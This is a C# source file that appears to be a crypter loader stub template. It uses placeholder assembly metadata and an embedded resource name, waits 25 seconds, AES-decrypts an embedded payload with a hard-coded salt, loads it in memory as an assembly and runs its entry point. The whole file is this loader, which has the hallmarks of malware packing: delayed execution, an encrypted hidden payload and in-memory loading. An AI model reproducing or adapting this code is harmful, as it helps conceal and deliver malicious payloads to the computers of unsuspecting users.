using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Resources;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;

[assembly: AssemblyTitle("#AssemblyProduct")]
[assembly: AssemblyDescription("#AssemblyDescription")]
[assembly: AssemblyCompany("#AssemblyProduct")]
[assembly: AssemblyProduct("#AssemblyProduct")]
[assembly: AssemblyCopyright("#AssemblyCopyright")]
[assembly: AssemblyTrademark("#AssemblyTrademark")]
[assembly: AssemblyFileVersion("#AssemblyMajorVersion" + "." + "#AssemblyMinorVersion" + "." + "#AssemblyBuildPart" + "." + "#AssemblyPrivatePart")]
[assembly: AssemblyVersion("#AssemblyMajorVersion" + "." + "#AssemblyMinorVersion" + "." + "#AssemblyBuildPart" + "." + "#AssemblyPrivatePart")]
[assembly: Guid("#Guid")]
[assembly: ComVisible(false)]

namespace Loader
{
    public class Program
    {
        [STAThread]
        public static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Nyan());
        }
    }

    public class Nyan : Form
    {
        public Nyan()
        {
            Initialize();
        }

        public void Initialize()
        {
            Thread.Sleep(25 * 1000);
            Assembly myAssembly = AppDomain.CurrentDomain.Load(AES_Decrypt(GetResource("#Stub")));
            Type myType = myAssembly.GetType("Stub.Program");
            dynamic myObj = Activator.CreateInstance(myType);
            myObj.Run();
        }

        private static byte[] AES_Decrypt(byte[] bytesToBeDecrypted)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var passwordBytes = Encoding.UTF8.GetBytes("#AesKey");
                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }
            return decryptedBytes;
        }

        private static byte[] GetResource(string file)
        {
            ResourceManager ResManager = new ResourceManager("#ParentResource", Assembly.GetExecutingAssembly());
            return (byte[])ResManager.GetObject(file);
        }
    }
}
